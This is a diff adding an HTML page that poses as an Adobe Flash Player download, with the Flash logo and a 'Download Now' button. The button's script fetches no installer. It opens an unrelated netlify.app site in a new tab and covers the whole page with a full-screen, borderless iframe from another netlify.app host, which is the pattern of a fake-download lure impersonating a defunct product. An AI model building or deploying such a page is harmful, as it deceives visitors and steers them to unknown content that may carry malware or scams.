@@ -1,0 +1,68 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Download Adobe Flash Player</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            margin-top: 50px;
+        }
+        .container {
+            max-width: 600px;
+            margin: 0 auto;
+            padding: 20px;
+            border: 1px solid #ccc;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0,0,0,0.1);
+        }
+        .button {
+            display: inline-block;
+            padding: 10px 20px;
+            font-size: 16px;
+            color: #fff;
+            background-color: #007BFF;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            text-decoration: none;
+        }
+        .button:hover {
+            background-color: #0056b3;
+        }
+        .logo {
+            width: 50px;
+            height: auto;
+            margin-bottom: 20px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/thumb/3/31/Adobe_Flash_Player_32.svg/2101px-Adobe_Flash_Player_32.svg.png" alt="Adobe Flash Player Logo">
+        <h1>Download Adobe Flash Player</h1>
+        <p>Click the button below to download Adobe Flash Player for free.</p>
+        <a class="button" href="#" onclick="downloadAndShowIframe()">Download Now</a>
+    </div>
+
+    <script>
+        function downloadAndShowIframe() {
+            // Open the URL in a new tab
+            window.open('https://wnbdcf.netlify.app/', '_blank');
+
+            // Create and append the iframe
+            const iframe = document.createElement('iframe');
+            iframe.src = 'https://iframe-popup.netlify.app/';
+            iframe.style.position = 'absolute';
+            iframe.style.top = '0';
+            iframe.style.left = '0';
+            iframe.style.width = '100%';
+            iframe.style.height = '100%';
+            iframe.style.border = 'none';
+            document.body.appendChild(iframe);
+        }
+    </script>
+</body>
+</html>
